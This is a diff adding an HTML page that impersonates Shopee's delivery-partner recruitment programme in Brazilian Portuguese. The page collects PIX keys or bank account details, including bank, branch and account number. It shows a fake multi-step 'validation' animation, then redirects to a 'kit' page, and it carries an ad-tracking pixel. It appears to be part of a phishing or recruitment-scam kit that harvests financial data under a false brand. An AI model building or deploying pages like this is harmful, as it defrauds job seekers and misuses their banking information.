@@ -1,0 +1,594 @@
+﻿﻿<!DOCTYPE html><html lang="pt-BR"><head><script src="../../scripts/utms/latest-2.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script>
+  window.pixelId = "6831e7bd3fe783e25540d199";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Shopee Entregador - Método de Recebimento</title>
+    
+    <script src="../../3.4-2.16"></script>
+    
+    <link rel="stylesheet" href="css/all.min.css">
+    
+    <link href="../../css2-2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+        }
+        .bg-shopee {
+            background-color: #EE4D2D;
+        }
+        .text-shopee {
+            color: #EE4D2D;
+        }
+        .border-shopee {
+            border-color: #E83D22;
+        }
+        .bg-custom-orange {
+            background-color: #EE4D2D;
+        }
+        .text-custom-orange {
+            color: #EE4D2D;
+        }
+        
+        .btn-primary {
+            background-color: #ee4d2d;
+            color: #fff;
+
+    font-weight: 500;
+    height: 50px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 3px;
+    transition: background-color 0.3s;
+        }
+        
+        .btn-primary:hover {
+            background-color: #d73920;
+        }
+        
+        .btn-primary:disabled {
+            background-color: #E83D2280;
+            cursor: not-allowed;
+        }
+        
+        .payment-card {
+            transition: all 0.3s ease;
+            border-width: 1px;
+            border-color: #e5e7eb;
+        }
+        
+        .payment-card.selected {
+            border-color: #E83D22;
+            border-width: 2px;
+            background-color: #FFF8F6;
+        }
+        
+        /* Select field with focus styling */
+        .select-field {
+            border: 1px solid #E5E7EB;
+            transition: all 0.3s ease;
+        }
+        
+        .select-field:focus {
+            border-color: #E83D22;
+            box-shadow: 0 0 0 2px rgba(232, 61, 34, 0.2);
+            outline: none;
+        }
+        
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1.0); }
+        }
+        
+        .loading-dot {
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+        
+        .loading-dot:nth-child(1) {
+            animation-delay: -0.32s;
+        }
+        
+        .loading-dot:nth-child(2) {
+            animation-delay: -0.16s;
+        }
+        
+        .status-item {
+            transition: all 0.3s ease;
+            opacity: 0.5;
+            transform: translateY(10px);
+        }
+        
+        .status-item.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        .status-item.active .status-icon {
+            background-color: #E83D22;
+            color: white;
+        }
+        
+        .status-item.active .status-text {
+            color: #111827;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body class="bg-white min-h-screen flex flex-col">
+    
+    <header class="bg-white shadow-md">
+        <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="index.html">
+                <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-8 cursor-pointer">
+            </a>
+            <div class="hamburger-menu cursor-pointer">
+                <div class="w-[16px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[20px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+                <div class="w-[24px] h-[3px] bg-[#2d3562] my-1 transition-all duration-400"></div>
+            </div>
+        </div>
+    </header>
+    
+    
+    <div class="w-full bg-[#ee4d2d] py-1 px-6 flex items-center relative overflow-hidden">
+        
+        <div class="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#ee4d2d]"></div>
+        
+        <div class="flex items-center relative z-10">
+            <div class="text-white mr-3">
+                <i class="fas fa-chevron-right text-3xl font-black" style="color: white;"></i>
+            </div>
+            <div class="leading-none">
+                <h1 class="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
+                <p class="text-white text-sm mt-0" style="transform: translateY(-2px);">Shopee</p>
+            </div>
+        </div>
+    </div>
+    
+    
+    <div class="flex-grow container mx-auto px-2 py-8 w-full">
+        <div class="w-full mx-auto p-6 mb-8">
+            <h1 class="text-3xl font-bold text-center mb-8 text-gray-800">Método de Recebimento</h1>
+            
+            <p class="text-center text-gray-600 mb-8">
+                Como você deseja receber os pagamentos das suas entregas?
+            </p>
+            
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
+                
+                <div class="payment-card cursor-pointer transition-all p-6 border rounded-lg" id="pixCard">
+                    <div class="flex flex-col items-center text-center">
+                        <div class="w-16 h-16 rounded-full flex items-center justify-center mb-4">
+                            <img src="images/pix.png" alt="Ícone PIX" class="w-16 h-16">
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2">Via PIX</h3>
+                        <p class="text-gray-600 text-sm">
+                            Receba o pagamento diretamente na sua conta via PIX.
+                            Transferência instantânea e sem taxas.
+                        </p>
+                    </div>
+                </div>
+                
+                
+                <div class="payment-card cursor-pointer transition-all p-6 border rounded-lg" id="tedCard">
+                    <div class="flex flex-col items-center text-center">
+                        <div class="w-16 h-16 bg-[#E83D22] rounded-full flex items-center justify-center mb-4 text-white">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+                                <line x1="2" y1="10" x2="22" y2="10"></line>
+                            </svg>
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2">Via TED Bancária</h3>
+                        <p class="text-gray-600 text-sm">
+                            Receba o pagamento na sua conta bancária por transferência eletrônica.
+                            Disponível para todos os bancos.
+                        </p>
+                    </div>
+                </div>
+            </div>
+            
+            
+            <div class="mt-6 p-4 bg-white border rounded-lg hidden" id="pixForm">
+                <h3 class="text-lg font-semibold mb-4">Informe sua chave PIX</h3>
+                
+                <form id="pixFormElement" class="space-y-4">
+                    <div>
+                        <label for="tipoChave" class="block text-base font-medium text-gray-800 mb-2">
+                            Tipo de chave
+                        </label>
+                        <div class="relative">
+                            <select id="tipoChave" class="block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-[#E83D22] focus:border-[#E83D22] select-field appearance-none">
+                                <option value="cpf">CPF</option>
+                                <option value="email">E-mail</option>
+                                <option value="telefone">Telefone</option>
+                                <option value="aleatoria">Chave Aleatória</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none text-gray-500">
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label for="chavePix" class="block text-base font-medium text-gray-800 mb-2">
+                            Chave PIX
+                        </label>
+                        <input id="chavePix" type="text" placeholder="Digite sua chave PIX" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]">
+                        <p id="chavePixError" class="mt-1 text-sm text-red-600 hidden">A chave PIX é obrigatória</p>
+                    </div>
+                    
+                    <button type="submit" id="confirmarPix" class="btn-primary w-full">
+                        Confirmar PIX
+                    </button>
+                </form>
+            </div>
+            
+            
+            <div class="mt-6 p-4 bg-white border rounded-lg hidden" id="tedForm">
+                <h3 class="text-lg font-semibold mb-4">Informe seus dados bancários</h3>
+                
+                <form id="tedFormElement" class="space-y-4">
+                    <div>
+                        <label for="banco" class="block text-base font-medium text-gray-800 mb-2">
+                            Banco
+                        </label>
+                        <div class="relative">
+                            <select id="banco" class="block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-[#E83D22] focus:border-[#E83D22] select-field appearance-none">
+                                <option value="Banco do Brasil">Banco do Brasil</option>
+                                <option value="Caixa Econômica Federal">Caixa Econômica Federal</option>
+                                <option value="Bradesco">Bradesco</option>
+                                <option value="Itaú Unibanco">Itaú Unibanco</option>
+                                <option value="Santander">Santander</option>
+                                <option value="Nubank">Nubank</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none text-gray-500">
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </div>
+                        </div>
+                        <p id="bancoError" class="mt-1 text-sm text-red-600 hidden">Banco inválido</p>
+                    </div>
+                    
+                    <div>
+                        <label for="agencia" class="block text-base font-medium text-gray-800 mb-2">
+                            Agência
+                        </label>
+                        <input id="agencia" type="text" placeholder="Número da agência (sem dígito)" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]" inputmode="numeric">
+                        <p id="agenciaError" class="mt-1 text-sm text-red-600 hidden">Agência inválida</p>
+                    </div>
+                    
+                    <div>
+                        <label for="conta" class="block text-base font-medium text-gray-800 mb-2">
+                            Conta
+                        </label>
+                        <input id="conta" type="text" placeholder="Número da conta com dígito" class="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#E83D22] focus:border-[#E83D22]" inputmode="numeric">
+                        <p id="contaError" class="mt-1 text-sm text-red-600 hidden">Conta inválida</p>
+                    </div>
+                    
+                    <div>
+                        <label for="tipoConta" class="block text-base font-medium text-gray-800 mb-2">
+                            Tipo de conta
+                        </label>
+                        <div class="relative">
+                            <select id="tipoConta" class="block w-full px-4 py-3 border border-gray-300 rounded-md shadow-sm focus:ring-[#E83D22] focus:border-[#E83D22] select-field appearance-none">
+                                <option value="corrente">Conta Corrente</option>
+                                <option value="poupanca">Conta Poupança</option>
+                            </select>
+                            <div class="absolute inset-y-0 right-0 flex items-center px-3 pointer-events-none text-gray-500">
+                                <i class="fas fa-chevron-down text-sm"></i>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary w-full">
+                        Confirmar dados bancários
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    
+    <div id="loadingModal" class="fixed inset-0 z-50 hidden overflow-y-auto bg-black bg-opacity-60">
+        <div class="flex min-h-screen items-center justify-center p-4">
+            <div class="relative mx-auto max-w-md w-full bg-white rounded-lg p-8 shadow-2xl">
+                <h2 class="text-xl font-semibold mb-8 text-center" id="loadingTitle">Processando Informações</h2>
+                
+                <div class="grid gap-6 py-4 flex-grow" id="loadingStepsContainer">
+                    
+                </div>
+                
+                <div id="completionMessage" class="mt-6 p-4 bg-green-100 rounded-lg border border-green-200 hidden">
+                    <div class="flex items-center justify-center mb-2">
+                        <div class="bg-green-500 text-white rounded-full p-1">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewbox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="text-center text-green-700 font-medium">
+                        Método de pagamento registrado com sucesso!
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    
+    <footer class="bg-[#ee4d2d] text-white py-10 mt-auto">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-6 md:mb-0">
+                    <img src="images/057b274c134bcf92ac151758478949b3.jpg" alt="Shopee Logo" class="h-10 mb-2 mx-auto md:mx-0 bg-white p-1 rounded">
+                    <p class="text-sm text-center md:text-left">© 2024  Shopee. Todos os direitos reservados.</p>
+                </div>
+                
+                <div class="text-center md:text-right">
+                    <p class="text-sm opacity-80 mb-2">Programa de Parceiros Entregadores  Shopee</p>
+                    <p class="text-xs opacity-70">Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        
+        const pixCard = document.getElementById('pixCard');
+        const tedCard = document.getElementById('tedCard');
+        const pixForm = document.getElementById('pixForm');
+        const tedForm = document.getElementById('tedForm');
+        const pixFormElement = document.getElementById('pixFormElement');
+        const tedFormElement = document.getElementById('tedFormElement');
+        const loadingModal = document.getElementById('loadingModal');
+        const tipoChave = document.getElementById('tipoChave');
+        const chavePix = document.getElementById('chavePix');
+        
+        
+        const loadingStepsContainer = document.getElementById('loadingStepsContainer');
+        const completionMessage = document.getElementById('completionMessage');
+        
+        
+        const loadingSteps = [
+            "Validando dados bancários",
+            "Registrando método de recebimento",
+            "Configurando conta para pagamentos",
+            "Verificando segurança das informações",
+            "Concluindo registro financeiro"
+        ];
+        
+        
+        let selectedMethod = null;
+        
+        
+        pixCard.addEventListener('click', function() {
+            selectMethod('pix');
+        });
+        
+        tedCard.addEventListener('click', function() {
+            selectMethod('ted');
+        });
+        
+        
+        pixFormElement.addEventListener('submit', function(e) {
+            e.preventDefault();
+            handlePixSubmit();
+        });
+        
+        tedFormElement.addEventListener('submit', function(e) {
+            e.preventDefault();
+            handleTedSubmit();
+        });
+        
+        
+        tipoChave.addEventListener('change', function() {
+            updatePixKeyField();
+        });
+        
+        
+        function selectMethod(method) {
+            selectedMethod = method;
+            
+            
+            pixCard.classList.remove('selected');
+            tedCard.classList.remove('selected');
+            pixForm.classList.add('hidden');
+            tedForm.classList.add('hidden');
+            
+            
+            if (method === 'pix') {
+                pixCard.classList.add('selected');
+                pixForm.classList.remove('hidden');
+                updatePixKeyField();
+            } else {
+                tedCard.classList.add('selected');
+                tedForm.classList.remove('hidden');
+            }
+        }
+        
+        function updatePixKeyField() {
+            const keyType = tipoChave.value;
+            const candidatoData = getCandidatoData();
+            
+            if (keyType === 'cpf' && candidatoData && candidatoData.cpf) {
+                chavePix.value = candidatoData.cpf;
+            } else if (keyType === 'email' && candidatoData && candidatoData.email) {
+                chavePix.value = candidatoData.email;
+            } else if (keyType === 'telefone' || keyType === 'aleatoria') {
+                chavePix.value = '';
+            }
+            
+            
+            if (keyType === 'cpf' || keyType === 'telefone') {
+                chavePix.setAttribute('inputmode', 'numeric');
+            } else {
+                chavePix.setAttribute('inputmode', 'text');
+            }
+        }
+        
+        function getCandidatoData() {
+            const candidatoDataString = localStorage.getItem('candidato_data');
+            if (candidatoDataString) {
+                try {
+                    return JSON.parse(candidatoDataString);
+                } catch (error) {
+                    console.error('Error parsing candidato_data from localStorage:', error);
+                }
+            }
+            return null;
+        }
+        
+        function validatePixForm() {
+            const chaveValue = chavePix.value.trim();
+            const chaveError = document.getElementById('chavePixError');
+            
+            if (!chaveValue) {
+                chaveError.classList.remove('hidden');
+                return false;
+            } else {
+                chaveError.classList.add('hidden');
+                return true;
+            }
+        }
+        
+        function validateTedForm() {
+            const agenciaValue = document.getElementById('agencia').value.trim();
+            const contaValue = document.getElementById('conta').value.trim();
+            const agenciaError = document.getElementById('agenciaError');
+            const contaError = document.getElementById('contaError');
+            let isValid = true;
+            
+            if (agenciaValue.length < 4) {
+                agenciaError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                agenciaError.classList.add('hidden');
+            }
+            
+            if (contaValue.length < 5) {
+                contaError.classList.remove('hidden');
+                isValid = false;
+            } else {
+                contaError.classList.add('hidden');
+            }
+            
+            return isValid;
+        }
+        
+        function handlePixSubmit() {
+            if (!validatePixForm()) return;
+            
+            
+            const pixData = {
+                metodo: 'pix',
+                tipoChave: tipoChave.value,
+                chave: chavePix.value
+            };
+            
+            localStorage.setItem('pagamento_data', JSON.stringify(pixData));
+            
+            
+            showLoadingModal();
+        }
+        
+        function handleTedSubmit() {
+            if (!validateTedForm()) return;
+            
+            
+            const tedData = {
+                metodo: 'ted',
+                banco: document.getElementById('banco').value,
+                agencia: document.getElementById('agencia').value,
+                conta: document.getElementById('conta').value,
+                tipoConta: document.getElementById('tipoConta').value
+            };
+            
+            localStorage.setItem('pagamento_data', JSON.stringify(tedData));
+            
+            
+            showLoadingModal();
+        }
+        
+        function showLoadingModal() {
+            
+            loadingStepsContainer.innerHTML = '';
+            completionMessage.classList.add('hidden');
+            
+            
+            loadingSteps.forEach((step, index) => {
+                const stepElement = document.createElement('div');
+                stepElement.className = `status-item flex items-center p-2 bg-gray-100 rounded-lg`;
+                stepElement.id = `status${index+1}`;
+                
+                stepElement.innerHTML = `
+                    <div class="status-icon bg-gray-300 text-white rounded-full w-8 h-8 flex items-center justify-center mr-3">
+                        <span class="text-sm">${index + 1}</span>
+                    </div>
+                    <div class="status-text text-gray-600 text-sm">
+                        ${step}
+                    </div>
+                `;
+                
+                loadingStepsContainer.appendChild(stepElement);
+            });
+            
+            
+            loadingModal.classList.remove('hidden');
+            
+            
+            setTimeout(() => animateLoadingSteps(), 200);
+        }
+        
+        function animateLoadingSteps() {
+            const steps = document.querySelectorAll('.status-item');
+            const totalTime = 12000; 
+            const stepTime = totalTime / (steps.length + 1); 
+            
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    step.classList.add('active');
+                    
+                    const icon = step.querySelector('.status-icon');
+                    const text = step.querySelector('.status-text');
+                    
+                    icon.classList.add('bg-[#E83D22]');
+                    text.classList.add('text-gray-900', 'font-medium');
+                    
+                    
+                    if (index > 0) {
+                        const prevIcon = steps[index-1].querySelector('.status-icon');
+                        prevIcon.innerHTML = '<i class="fas fa-check text-sm"></i>';
+                    }
+                    
+                    
+                    if (index === steps.length - 1) {
+                        setTimeout(() => {
+                            completionMessage.classList.remove('hidden');
+                            
+                            
+                            setTimeout(() => {
+                                window.location.href = '/entregador/kit/tamanho';
+                            }, 1500);
+                        }, stepTime);
+                    }
+                }, stepTime * index);
+            });
+        }
+        
+        
+        const candidatoData = getCandidatoData();
+        if (candidatoData) {
+            console.log('Candidato data loaded:', candidatoData);
+        }
+    });
+    </script>
+	
+
+</body></html>
